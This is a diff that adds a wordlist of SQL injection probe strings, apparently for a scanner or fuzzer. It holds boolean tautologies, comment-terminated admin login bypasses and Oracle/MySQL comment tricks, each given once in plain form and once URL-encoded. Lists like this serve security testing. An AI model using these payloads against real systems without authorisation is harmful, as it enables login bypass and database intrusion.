@@ -1,0 +1,82 @@
+1e100
+2 or 2=2
+2' or '2'='2
+999999999999999999
+" or 1=1#
+#mysql
+'
+'#mysql
+'/*ora_mysql*/and/**/'2'='0
+'/*ora_mysql*/and/**/'2'='2
+'/*ora_mysql*/or/**/'2'='2
+' and '2'='0
+' and '2'='0'#mysql
+' and '2'='0'-- oracle
+' and '2'='2
+' and '2'='2'#mysql
+' and '2'='2'-- oracle
+' or 1=1--
+' or '2'='2
+'test
+'test--
+--ora_sqls
+/*ora_mysql*/and/**/2=0
+/*ora_mysql*/and/**/2=2
+admin'
+admin'#
+admin'--
+ and 1=1
+ and 2=0
+ and 2=0#mysql
+ and 2=0-- oracle_mysql
+ and 2=2#mysql
+ and 2=2-- oracle_mysql
+ and USER=USER
+ and user()=user()
+now()
+or 1=1
+or 1=1#
+or 1=1--
+ or 2=2
+order by 1--
+1e100
+2+or+2%3d2
+2'+or+'2'%3d'2
+999999999999999999
+"+or+1%3d1%23
+%23mysql
+'
+'%23mysql
+'/*ora_mysql*/and/**/'2'%3d'0
+'/*ora_mysql*/and/**/'2'%3d'2
+'/*ora_mysql*/or/**/'2'%3d'2
+'+and+'2'%3d'0
+'+and+'2'%3d'0'%23mysql
+'+and+'2'%3d'0'--+oracle
+'+and+'2'%3d'2
+'+and+'2'%3d'2'%23mysql
+'+and+'2'%3d'2'--+oracle
+'+or+1%3d1--
+'+or+'2'%3d'2
+'test
+'test--
+--ora_sqls
+/*ora_mysql*/and/**/2%3d0
+/*ora_mysql*/and/**/2%3d2
+admin'
+admin'%23
+admin'--
++and+1%3d1
++and+2%3d0
++and+2%3d0%23mysql
++and+2%3d0--+oracle_mysql
++and+2%3d2%23mysql
++and+2%3d2--+oracle_mysql
++and+USER%3dUSER
++and+user()%3duser()
+now()
+or+1%3d1
+or+1%3d1%23
+or+1%3d1--
++or+2%3d2
+order+by+1--
